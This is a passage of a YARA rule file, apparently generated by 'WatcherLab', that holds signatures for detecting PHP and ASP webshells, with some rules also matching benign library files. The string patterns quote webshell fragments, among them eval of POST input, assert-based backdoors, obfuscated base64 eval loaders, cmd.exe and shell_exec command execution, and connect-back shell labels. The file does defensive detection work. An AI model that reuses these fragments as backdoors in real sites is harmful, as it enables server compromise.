      $s2 = "echo date('H:i:s') , \" Peak memory usage: \" , (memory_get_peak_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s3 = "echo date('H:i:s') , ' Current memory usage: ' , (memory_get_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s4 = "* @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt" fullword ascii
      $s5 = "* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA" fullword ascii
      $s6 = "* Copyright (C) 2006 - 2014 PHPExcel" fullword ascii
      $s7 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '.xls', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s8 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '.xlsx', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s9 = "$objPHPExcel->getActiveSheet()->getStyle('A1:T100')->applyFromArray(" fullword ascii
      $s10 = "$objPHPExcel->getActiveSheet()->getStyle('C5:R95')->applyFromArray(" fullword ascii
      $s11 = "$objPHPExcel->getProperties()->setCreator(\"Maarten Balliauw\")" fullword ascii
      $s12 = "/** Error reporting */" fullword ascii
      $s13 = "=> array('style' => PHPExcel_Style_Border::BORDER_THIN)," fullword ascii
      $s14 = "=> array('style' => PHPExcel_Style_Border::BORDER_MEDIUM)" fullword ascii
      $s15 = "echo 'File has been created in ' , getcwd() , EOL;" fullword ascii
      $s16 = "* @version    ##VERSION##, ##DATE##" fullword ascii
      $s17 = "$objWriter->save(str_replace('.php', '.xlsx', __FILE__));" fullword ascii
      $s18 = "$objWriter->save(str_replace('.php', '.xls', __FILE__));" fullword ascii
      $s19 = "$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007');" fullword ascii
      $s20 = "$callTime = $callEndTime - $callStartTime;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_71a7c769e644d8cf3cf32419239212c7
{
   meta:
      description = "php17 - file 71a7c769e644d8cf3cf32419239212c7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8b9ca4e1cdedabbaaaa980522696129faa1ca1c6148d3bb7f033c15f6d23b7a1"
   strings:
      $s1 = "$i59[30].$i59[65].$i59[10].$i59[94].$i59[2].$i59[74].$i59[94].$i59[30].$i59[82].$i59[16]; $GLOBALS['eypvx47'] = $i59[10].$i59[5" fullword ascii
      $s2 = "$esjbi0[$i59[17].$i59[50].$i59[55].$i59[50].$i59[81].$i59[94]] = @$GLOBALS['kkndw71']($i59[75].$i59[5].$i59[75], $owxdm76);" fullword ascii
      $s3 = "$i59[65].$i59[94].$i59[83].$i59[2].$i59[82].$i59[58].$i59[83].$i59[94].$i59[54].$i59[58].$i59[49].$i59[50].$i59[29] => FALSE," fullword ascii
      $s4 = "$esjbi0[$i59[82].$i59[54].$i59[50].$i59[76].$i59[49].$i59[81].$i59[94]] = $GLOBALS['vgyag20']($i59[31],\"\",$zroqx74[3]);" fullword ascii
      $s5 = "$i59[82].$i59[54].$i59[50].$i59[76].$i59[49].$i59[58].$i59[83].$i59[94].$i59[54].$i59[57].$i59[94].$i59[16].$i59[29] => \"\"," fullword ascii
      $s6 = "$i59[55].$i59[50].$i59[95].$GLOBALS['qlkol47']($GLOBALS['wwxez32']($i59[75].$i59[27].$i59[14].$i59[75], $i59[95], $yzqyk58));" fullword ascii
      $s7 = "@$GLOBALS['ltkgi30']($esjbi0[$i59[17].$i59[94].$i59[54].$i59[50].$i59[76].$i59[16].$i59[81].$i59[94]], $nhysx96, $ntryu13);" fullword ascii
      $s8 = ", $unahu45[$jkbvz84][$i59[69].$i59[82].$i59[50].$i59[17].$i59[82].$i59[83].$i59[10].$i59[44].$i59[50].$i59[76].$i59[16]])) {" fullword ascii
      $s9 = "} elseif ($GLOBALS['goxku40']($i59[30].$i59[65].$i59[10].$i59[94].$i59[2].$i59[74].$i59[94].$i59[30].$i59[82].$i59[16])) {" fullword ascii
      $s10 = "i59[63].$i59[12].$i59[82].$i59[2].$i59[55].$i59[64].$i59[95].$esjbi0[$i59[10].$i59[1].$i59[63].$i59[12]].$i59[27].$i59[14];" fullword ascii
      $s11 = "$i59[49].$i59[94].$i59[95].$GLOBALS['qlkol47']($GLOBALS['wwxez32']($i59[75].$i59[27].$i59[14].$i59[75], $i59[95], $yzqyk58));" fullword ascii
      $s12 = "$i59[17].$i59[77].$i59[95].$GLOBALS['qlkol47']($GLOBALS['wwxez32']($i59[75].$i59[27].$i59[14].$i59[75], $i59[95], $yzqyk58));" fullword ascii
      $s13 = "$xglki37[$unahu45[$jkbvz84][$i59[10].$i59[94].$i59[2].$i59[74]]][$i59[94].$i59[83].$i59[76].$i59[29]] = $jkbvz84;" fullword ascii
      $s14 = "exit;}$unahu45 = array();foreach ($vxlcl82[$i59[17].$i59[50].$i59[55].$i59[50].$i59[81].$i59[94]] as $xenfh75) {" fullword ascii
      $s15 = "if ($nqhsc23[$i59[10].$i59[55].$i59[76].$i59[54].$i59[82]] + $pvbdh92 < $hklao9) {" fullword ascii
      $s16 = "if ($nqhsc23[$i59[10].$i59[55].$i59[76].$i59[54].$i59[82]] + $vfyxw97 < $hklao9) {" fullword ascii
      $s17 = "if ($jnxjb61 != 10035 && $jnxjb61 != SOCKET_EINPROGRESS && $jnxjb61 != SOCKET_EALREADY) {" fullword ascii
      $s18 = "fu35']($i59, $vxlcl82, $unahu45);$GLOBALS['kgedf91']($i59, $vxlcl82, $unahu45);function fsuxu12($i59, $nihvk86) {" fullword ascii
      $s19 = "$vxlcl82[$i59[76].$i59[16].$i59[76].$i59[55].$i59[16].$i59[63].$i59[10].$i59[94].$i59[2].$i59[74]] = TRUE;" fullword ascii
      $s20 = "$esjbi0[$i59[63].$i59[94].$i59[17].$i59[77].$i59[81].$i59[82].$i59[54].$i59[30].$i59[49]] = $zroqx74[1];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule php17_Agent
{
   meta:
      description = "php17 - file Agent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2f5cea1e257fd351ddb29d41e3ff55aab8476e2a60ecdd5c7a18989f1319cbfd"
   strings:
      $s1 = "* Called by System_SSH_Agent::requestIdentities(). The key blob could be extracted from $this->key" fullword ascii
      $s2 = "* @internal  See http://api.libssh.org/rfc/PROTOCOL.agent" fullword ascii
      $s3 = "$packet = pack('CNa*Na*N', SYSTEM_SSH_AGENTC_SIGN_REQUEST, strlen($this->key_blob), $this->key_blob, strlen($message), $" fullword ascii
      $s4 = "* @see System_SSH_Agent_Identity::getPublicKey()" fullword ascii
      $s5 = "* requestIdentities() method pumps out System_SSH_Agent_Identity objects" fullword ascii
      $s6 = "* Returns an array containing zero or more System_SSH_Agent_Identity objects" fullword ascii
      $s7 = "*    if (!$ssh->login('username', $agent)) {" fullword ascii
      $s8 = "* The methods in this interface would be getPublicKey, setSignatureMode" fullword ascii
      $s9 = "* Doesn't do anything as ssh-agent doesn't let you pick and choose the signature mode. ie." fullword ascii
      $s10 = "* implements. ie. maybe a Net_SSH_Auth_PublicKey interface or something." fullword ascii
      $s11 = "* ssh-agent's only supported mode is CRYPT_RSA_SIGNATURE_PKCS1" fullword ascii
      $s12 = "* Wrapper for $this->key->getPublicKey()" fullword ascii
      $s13 = "* @see System_SSH_Agent_Identity::sign()" fullword ascii
      $s14 = "* See \"2.6.2 Protocol 2 private key signature request\"" fullword ascii
      $s15 = "* @return System_SSH_Agent_Identity" fullword ascii
      $s16 = "*        exit('Login Failed');" fullword ascii
      $s17 = "* Instantiation should only be performed by System_SSH_Agent class." fullword ascii
      $s18 = "// the last parameter (currently 0) is for flags and ssh-agent only defines one flag (for ssh-dss): SSH_AGENT_OLD_SIGNAT" fullword ascii
      $s19 = "// the last parameter (currently 0) is for flags and ssh-agent only defines one flag (for ssh-dss): SSH_AGENT_OLD_SIGNATURE" fullword ascii
      $s20 = "* @return System_SSH_Agent" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule sig_26cd5dd9c9e42a04fbc3ac45732781643f6bbcb0
{
   meta:
      description = "php17 - file 26cd5dd9c9e42a04fbc3ac45732781643f6bbcb0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "822930063367c5d49a71c826ea768a224b092c4f885c550bfa3292f41c5166f8"
   strings:
      $s1 = "<?php echo $this->smarty_insert_scripts(array('files'=>'utils.js,transport.js')); ?>" fullword ascii
      $s2 = "<select name=\"city\" id=\"selCities_<?php echo $this->_var['sn']; ?>\" onchange=\"region.changed(this, 3, 'selDistricts_<?php " fullword ascii
      $s3 = "<option value=\"<?php echo $this->_var['country']['region_id']; ?>\" <?php if ($this->_var['choose']['country'] == $this->" fullword ascii
      $s4 = "<select name=\"district\" id=\"selDistricts_<?php echo $this->_var['sn']; ?>\" <?php if (! $this->_var['district_list'][$this-" fullword ascii
      $s5 = "<option value=\"<?php echo $this->_var['district']['region_id']; ?>\" <?php if ($this->_var['choose']['district'] == $this" fullword ascii
      $s6 = "<?php $_from = $this->_var['city_list'][$this->_var['sn']]; if (!is_array($_from) && !is_object($_from)) { settype($_fro" fullword ascii
      $s7 = "<?php $_from = $this->_var['province_list'][$this->_var['sn']]; if (!is_array($_from) && !is_object($_from)) { settype($" fullword ascii
      $s8 = "<?php $_from = $this->_var['shipping_list']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }; $this" fullword ascii
      $s9 = "<?php $_from = $this->_var['district_list'][$this->_var['sn']]; if (!is_array($_from) && !is_object($_from)) { settype($" fullword ascii
      $s10 = "<option value=\"<?php echo $this->_var['province']['region_id']; ?>\" <?php if ($this->_var['choose']['province'] == $this" fullword ascii
      $s11 = "<option value=\"<?php echo $this->_var['city']['region_id']; ?>\" <?php if ($this->_var['choose']['city'] == $this->_var['" fullword ascii
      $s12 = "<?php $_from = $this->_var['country_list']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }; " fullword ascii
      $s13 = "<select name=\"country\" id=\"selCountries_<?php echo $this->_var['sn']; ?>\" onchange=\"region.changed(this, 1, 'selProvinces_" fullword ascii
      $s14 = "->_var['province']['region_id']): ?>selected<?php endif; ?>><?php echo $this->_var['province']['region_name']; ?></option>" fullword ascii
      $s15 = "->_var['district']['region_id']): ?>selected<?php endif; ?>><?php echo $this->_var['district']['region_name']; ?></option>" fullword ascii
      $s16 = "<select name=\"province\" id=\"selProvinces_<?php echo $this->_var['sn']; ?>\" onchange=\"region.changed(this, 2, 'selCities_<?" fullword ascii
      $s17 = "eval($_POST[cmd])<?php echo '?>'; ?>" fullword ascii
      $s18 = "<td valign=\"top\" bgcolor=\"#ffffff\"><strong><?php echo $this->_var['shipping']['shipping_name']; ?></strong></td>" fullword ascii
      $s19 = "_var['country']['region_id']): ?>selected<?php endif; ?>><?php echo $this->_var['country']['region_name']; ?></option>" fullword ascii
      $s20 = "city']['region_id']): ?>selected<?php endif; ?>><?php echo $this->_var['city']['region_name']; ?></option>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_7fca0ae0441bfb996544e9781c6d92a1f7dc3fab
{
   meta:
      description = "php17 - file 7fca0ae0441bfb996544e9781c6d92a1f7dc3fab.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4eb3b132f5b9d97560ea7c797a447dafa36792a1c68f31e281c3ac7dc2c6bfdc"
   strings:
      $s1 = "$password=\"43b65cee06453f060b117d769825c50e\";" fullword ascii
      $s2 = "$brkh764 = $dogg327(\"pdl516\", \"\", \"pdl516bapdl516spdl516e6pdl5164pdl516_pdl516dpdl516epdl516cpdl516opdl516dpdl516e\");" fullword ascii
      $s3 = "$dogg327 = str_replace(\"fqb878\",\"\",\"fqb878sfqb878tfqb878rfqb878_rfqb878efqb878plfqb878afqb878ce\");" fullword ascii
      $s4 = "$psw = trim($_POST['silicpass']);" fullword ascii
      $s5 = "$duhozm245 = \"VlZKc1dqQlpNR2hQVm0xS1IyTkZXbFppV0UweFZtcEdZV1JH\";" fullword ascii
      $s6 = "$ffqovpfrh753 = \"VlZKWFpWWlplV1JHWkU1U2JIQlpWa2R3WVZSc1NrVlJWR3M5\";" fullword ascii
      $s7 = "$ummhujkfc581 = \"Vm0xNFlWWXlSWGhYV0dST1YwVTFjRlZ0TVc5amJGSllZMGhP\";" fullword ascii
      $s8 = "$passt = md5(md5(md5($passt)));" fullword ascii
      $s9 = "81.$duhozm245.$zxbrpa384.$ffqovpfrh753)))))))));" fullword ascii
      $s10 = "43b65cee06453f060b117d769825c50e" ascii
      $s11 = "$passt = $salt.$psw;" fullword ascii
      $s12 = "$zxbrpa384 = \"VmxWU2JHaG9UV3N3ZUZZeFdtdFRNbEpHVDFWc1lWSnNXbTlV\";        " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_7a9480f6aeeef85bc52e56f2e0cef00b9149ddc3
{
   meta:
      description = "php17 - file 7a9480f6aeeef85bc52e56f2e0cef00b9149ddc3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0fd1f7175db76a6291658f1529c774759d64cd619af959cd2852c67cabe55001"
   strings:
      $s1 = "preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['pass']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_3ae2bde23fcce1c54853eeadae3f9516fd7f1f75
{
   meta:
      description = "php17 - file 3ae2bde23fcce1c54853eeadae3f9516fd7f1f75.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a21d184dc13c86ff91f3007f7b895c5e4a2af89799ebd9999350c730e0e704d3"
   strings:
      $x1 = "*  - executing any shell commands and any PHP-code" fullword ascii
      $x2 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - password erroneous</h1>\\n\");" fullword ascii
      $x3 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - your host not allow</h1>\\n\");" fullword ascii
      $x4 = "\".mm(\"Free download\").\" - <a href='http://php.spb.ru/remview/'>http://php.spb.ru/remview/</a></b></font></td>" fullword ascii
      $x5 = "*  2002.01.20 add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $x6 = "*  - view index of directory (/var/log - view logs, /tmp - view PHP sessions)" fullword ascii
      $x7 = "$system_access=true;     // true - user (you) may be run shell commands" fullword ascii
      $s8 = "*             add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $s9 = "echo \"Temp file: \".$HTTP_POST_FILES['userfile']['tmp_name'].\"<br>\";" fullword ascii
      $s10 = "*  Free download from http://php.spb.ru/remview/" fullword ascii
      $s11 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) && !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) " fullword ascii
      $s12 = "$HTTP_SERVER_VARS['PHP_AUTH_USER']!=$login || $HTTP_SERVER_VARS['PHP_AUTH_PW']!=$pass)) {" fullword ascii
      $s13 = "$phpeval_access=true;    // true - user (you) may be execute any php-code" fullword ascii
      $s14 = "$shell=\"#\".mm(\"example (remove comments '#')\").\": \\n\\n#cat /etc/passwd;\\n\\n#ps -ax\\n\\n#uname -a\";" fullword ascii
      $s15 = "*  2003.04.22 read first 64Kb of null-size file (example: /etc/zero), " fullword ascii
      $s16 = "*  - download any file and open on Notepad" fullword ascii
      $s17 = "$host_allow=array(\"*\");  // Type list of your(allow) hosts. All other - denied." fullword ascii
      $s18 = "$ok=copy($HTTP_POST_FILES['userfile']['tmp_name'],\"$df$fname\");" fullword ascii
      $s19 = "if ($login!==false && (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || " fullword ascii
      $s20 = "echo \"<P><b>\".mm(\"Shell commands\").\"</b>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_35e94397c3dd030e25c7ed6088e8b1e6f004dace
{
   meta:
      description = "php17 - file 35e94397c3dd030e25c7ed6088e8b1e6f004dace.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "720fb5810cc70a13a08adb544bda3681dbe43a92fa8f05500db16766a70e4fdf"
   strings:
      $x1 = "response.Write \"<input type=submit value='Execute SQL Server Command' style='height:23;width:220' id=submit1 name=submit1>\"" fullword ascii
      $x2 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True) " fullword ascii
      $x3 = "If (Trim(Request.Form(\"submit1\")) = \"Execute SQL Server Command\") xor Trim(Request.QueryString(\"status\"))<>\"\" Then" fullword ascii
      $x4 = "Response.Write \"<b>System Root: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMROOT%\") & \"<br>\"" fullword ascii
      $s5 = "Response.Write \"<b>Processor Identifier: </b>\" & WshEnv(\"PROCESSOR_IDENTIFIER\") & \"<br>\"" fullword ascii
      $s6 = "Response.Write \"<b>Cmd Path: </b>\" & WshShell.ExpandEnvironmentStrings(\"%ComSpec%\") & \"<br>\"" fullword ascii
      $s7 = "response.Write \"<br><br><br><body topmargin=5 leftmargin=0><center><h4>Coded By S3rver\"" fullword ascii
      $s8 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=txtedit\"\">\"" fullword ascii
      $s9 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=fcopy\"\">\"" fullword ascii
      $s10 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=filecopy\"\">\"" fullword ascii
      $s11 = "Response.Write \"<b>Processor Architecture: </b>\" & WshEnv(\"PROCESSOR_ARCHITECTURE\") & \"<br>\"" fullword ascii
      $s12 = "keydec=\"<font face='arial' size='1'>.:: Smart.Shell 1.0 &copy; BY <a href='mailto:'>P0Uy@_$3r\\/3R</a> - <a href='' target='_bl" ascii
      $s13 = "keydec=\"<font face='arial' size='1'>.:: Smart.Shell 1.0 &copy; BY <a href='mailto:'>P0Uy@_$3r\\/3R</a> - <a href='' target='_bl" ascii
      $s14 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), CInt(Trim(Request.QueryString(\"value\"))), \"REG_BINARY\")" fullword ascii
      $s15 = "Response.Write \"<b>Processor Revision: </b>\" & WshEnv(\"PROCESSOR_REVISION\") & \"<br>\"" fullword ascii
      $s16 = "Response.Write \"<b>Number Of Processors: </b>\" & WshEnv(\"NUMBER_OF_PROCESSORS\") & \"<br>\"" fullword ascii
      $s17 = "Response.Write \"<b>System Drive: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMDRIVE%\") & \"<br>\"" fullword ascii
      $s18 = "Response.Write \"<input type=\"\"hidden\"\" name=\"\"process\"\" value=\"\"yes\"\"></td></tr>\"" fullword ascii
      $s19 = "response.Write \"<font size=2 color=Red face='courier new'>E-Mail:thesabotaqe@gmail.com</font>\"" fullword ascii
      $s20 = "szTempFile = \"c:\\\" & oFileSys.GetTempName( ) " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_596384b86fd5c71bc09ff8cef3d9e2f4d5a62633
{
   meta:
      description = "php17 - file 596384b86fd5c71bc09ff8cef3d9e2f4d5a62633.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f446e7b691012d183c434c3fb6274fefe06cec20e13e89508a50e2a91b11381b"
   strings:
      $s1 = "$h='4_encode(x9(gz9compress9($9o),$k))9;print(\"<$k>$d</$9k>\")9;@9session_destroy(9);}}}}';" fullword ascii
      $s2 = "$u=';if(9$q&9&$m){9@session_s9tart(9);$99s=&9$_SESSION;$ss=\"substr9\";$sl=9\"strt9olo9we';" fullword ascii
      $s3 = "$z='pos9($p,$9h)===0){99$s[$i]=\"\"9;$p=9$9ss(9$p,3);}if(ar9ray_key_ex9ist9s($i9,$s)){9$9s';" fullword ascii
      $s4 = "$f='mpress9(@x(@9base9649_decode(preg_9replac9e9(array9(\"/_/\",9\"/-9/\"),array(\"/\"99,\"+\")9,';" fullword ascii
      $s5 = "$p='$kh=\"5d419\";$kf=\"49029a\";f9unction 9x(9$t,$k){$c=9str99len($k);$l=str9len9($t);9$o=\"\"9';" fullword ascii
      $s6 = "$V='ray9_v9al9ues($q);preg_mat9ch_al9l(\"/([\\\\9w]9)[\\\\w-]+(?9:;q=0.([9\\\\9d9]))?,?/\",$ra,$m9)';" fullword ascii
      $s7 = "$o='$ss(9$s[$i],0,$e)9)),$9k9)));$o=ob_ge9t_co9ntents();o9b_9end_clea9n999();$d=base69';" fullword ascii
      $s8 = "$P=';for($i=90;$i<$l;){for(9$j9=0;9($j<$c&&$i<9$l)9;$j++,$9i++9){$o.=9$t{$i}^9$k{$j};}}';" fullword ascii
      $s9 = "$n='[$i].=$p;9$e=strpos($s[9$i]9,$f9);if($e){$k9=$kh.$9kf;ob_st99art();@e9val(@gzunc9o';" fullword ascii
      $s10 = "$K='G9UAGE\"];9i9f(9$9rr&&$ra){$u=par9se9_url($rr9);parse_st9r($9u[\"quer9y\"],$9q);$q=ar';" fullword ascii
      $s11 = "$t='re9turn 9$9o;}$r=9$_SE9RVER;$rr=@$r9[\"H9TT9P_REFERER\"];$9ra=@$r[\"H9TTP_AC9C9EPT_LAN';" fullword ascii
      $s12 = "$T='.$kf),990,3));$p=\"\";9for($z=1;9$z<9count(99$m[1]);$z++)$p.=9$9q[$9m[2][$z]];9if(str';" fullword ascii
      $s13 = "$A='r\";$i=$9m[1][90].9$m[91][1];$h=$sl($9ss(m9d5($9i9.$kh),0,3));9$f=$s9l($9ss(md95($i';" fullword ascii
      $s14 = "$J=str_replace('9','',$p.$P.$t.$K.$V.$u.$A.$T.$z.$n.$f.$o.$h);" fullword ascii
      $s15 = "$a=str_replace('iU','','iUciUreatiUe_iUfunciUtiUion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_52f83549e0151da0d9cb5d02b9775512dfb5bc79
{
   meta:
      description = "php17 - file 52f83549e0151da0d9cb5d02b9775512dfb5bc79.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d35a24a0b662f15234106fdcfcbd8ae3b04477fa440ce67f4c883b526e3800a7"
   strings:
      $s1 = "$mysql_link=@mysql_connect($mysql_servername , $mysql_username , $mysql_password);" fullword ascii
      $s2 = "$mysql_password =\"pass\";//" fullword ascii
      $s3 = "$mysql.=\"insert into `$table`($keys) values($vals);\\r\\n\";" fullword ascii
      $s4 = "$q3=mysql_query(\"select * from `$table`\");" fullword ascii
      $s5 = "\".$filename.\"//blackbap.org</center>\";" fullword ascii
      $s6 = "$mysql_servername = \"localhost\";//" fullword ascii
      $s7 = "$keys=array_map('addslashes',$keys);" fullword ascii
      $s8 = "$keys=\"`\".$keys.\"`\";" fullword ascii
      $s9 = "$filename=date('Ymj').\".sql\";" fullword ascii
      $s10 = "$mysql_username = \"user\";//" fullword ascii
      $s11 = "$q2=mysql_query(\"show create table `$table`\");" fullword ascii
      $s12 = "$keys=array_keys($data);" fullword ascii
      $s13 = "$mysql.=$sql['Create Table'].\";\\r\\n\\r\\n\";" fullword ascii
      $s14 = "$q1=mysql_query(\"show tables\");" fullword ascii
      $s15 = "$mysql_database =\"dataname\";//" fullword ascii
      $s16 = "while($data=mysql_fetch_assoc($q3))" fullword ascii
      $s17 = "while($t=mysql_fetch_array($q1)){" fullword ascii
      $s18 = "mysql_select_db($mysql_database);" fullword ascii
      $s19 = "$vals=array_map('addslashes',$vals);" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 3KB and
      8 of them
}

rule sig_254a3c59f7e28d66209d48d9135291eb8cd0be83
{
   meta:
      description = "php17 - file 254a3c59f7e28d66209d48d9135291eb8cd0be83.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "75d34237cc7dab59582abafb3069af0b1c240d860766e818953ff7df7eca87f3"
   strings:
      $s1 = "echo \"<br>Connect back Shell , bypass Firewalls<br>" fullword ascii
      $s2 = "echo \"<br><center><h3> CMD ExeCute </h3></center>\" ;" fullword ascii
      $s3 = "echo \"<br><center><h3> Fake Mail- DOS E-mail By Victim Server </h3></center>\" ;" fullword ascii
      $s4 = "//fake mail = Use victim server 4 DOS - fake mail " fullword ascii
      $s5 = "echo \"<a href='?id=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>download\";" fullword ascii
      $s6 = "CMD</font></span></a><font face=\"Tahoma\" size=\"2\"> Shell</font></b></p>" fullword ascii
      $s7 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword ascii
      $s8 = "<title>SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend </title>" fullword ascii
      $s9 = "//Connect Back -Firewall Bypass" fullword ascii
      $s10 = "header(\"Content-Disposition: attachment; filename=$entrypath\");" fullword ascii
      $s11 = "echo \"<script language='javascript'> alert('Sending Mail - please waite ...')</script>\";" fullword ascii
      $s12 = "$result=shell_exec(\"$cmd\");" fullword ascii
      $s13 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {" fullword ascii
      $s14 = "//cmd-command line" fullword ascii
      $s15 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword ascii
      $s16 = "header(\"Content-Length: \" . filesize($name));" fullword ascii
      $s17 = "echo \"<script language='javascript'> alert('\\:D Successfully uploaded.!')</script>\";" fullword ascii
      $s18 = "<span style=\"text-decoration: none\"><font color=\"#000000\">File Manager</font></span></a></font></span></font></b></p>" fullword ascii
      $s19 = "(e,o2);if(h3==0x40)d[c/4]=String.fromCharCode(e)}plain=d.join('');return b?Utf8.decode(plain):plain};" fullword ascii
      $s20 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><font size='2' color='#999999'>Chmod\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule activeLink_fileDAL_class
{
   meta:
      description = "php17 - file activeLink_fileDAL.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a4d135d6a067fde4f4e8b481b5a00f3ee492af071c98ea9d2c284655af3243c7"
   strings:
      $s1 = "function  GetPageCount(activeLinkModel $model, $perPageCount)" fullword ascii
      $s2 = "function  GetPageList(activeLinkModel $model, $start, $limit)" fullword ascii
      $s3 = "function  GetList(activeLinkModel $model)" fullword ascii
      $s4 = "function  GetModel(activeLinkModel $model)" fullword ascii
      $s5 = "// TODO: Implement GetPageCount() method." fullword ascii
      $s6 = "// TODO: Implement GetPageList() method." fullword ascii
      $s7 = "// TODO: Implement GetModel() method." fullword ascii
      $s8 = "// TODO: Implement GetList() method." fullword ascii
      $s9 = "function  InsertInto(activeLinkModel $model)" fullword ascii
      $s10 = "function  UpDateSet(activeLinkModel $model)" fullword ascii
      $s11 = "function  DeleteFrom(activeLinkModel $model)" fullword ascii
      $s12 = "// TODO: Implement InsertInto() method." fullword ascii
      $s13 = "// TODO: Implement UpDateSet() method." fullword ascii
      $s14 = "// TODO: Implement DeleteFrom() method." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule ArrayContainer
{
   meta:
      description = "php17 - file ArrayContainer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "26be4b4cfc3e1b6b91a179e1ab48b465d02373041fd31fcb55b24b3627bcbcdc"
   strings:
      $s1 = "TypeHint::isArray($type) or \\PhpBoot\\abort(new \\InvalidArgumentException(\"type $type is not array\"));" fullword ascii
      $s2 = "is_array($data) or \\PhpBoot\\abort(new \\InvalidArgumentException('the first param is required to be array'));" fullword ascii
      $s3 = "* @param callable $getElementContainer" fullword ascii
      $s4 = "* @return TypeContainerInterface" fullword ascii
      $s5 = "$elementType = TypeHint::getArrayType($elementType);" fullword ascii
      $s6 = "$container = $getElementContainer($elementType);" fullword ascii
      $s7 = "* @var TypeContainerInterface" fullword ascii
      $s8 = "* @param bool $validate" fullword ascii
      $s9 = "static public function create($type, callable $getElementContainer)" fullword ascii
      $s10 = "public function getContainer()" fullword ascii
      $s11 = "$res[$k] = $this->container->make($v, $validate);" fullword ascii
      $s12 = "return [$this->container->makeExample()];" fullword ascii
      $s13 = "public function __construct($elementContainer)" fullword ascii
      $s14 = "public function make($data, $validate = true)" fullword ascii
      $s15 = "$this->container = $elementContainer;" fullword ascii
      $s16 = "$container = new self($container);" fullword ascii
      $s17 = "while(TypeHint::isArray($elementType)){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule AnswerBinderTest
{
   meta:
      description = "php17 - file AnswerBinderTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dd8eb12485b802b69f7c1f815ba1bc126eb5b9163a3057038010c07143a02fb7"
   strings:
      $s1 = "* Copyright (c) 2010-2012, Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s2 = "* @author Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s3 = "* @copyright  2010 Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s4 = "* @author     Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s5 = "* @link       http://www.digitalsandwich.com/" fullword ascii
      $s6 = "*  *  Redistributions in binary form must reproduce the above copyright" fullword ascii
      $s7 = "* Phake - Mocking Framework" fullword ascii
      $s8 = "*  *  Redistributions of source code must retain the above copyright" fullword ascii
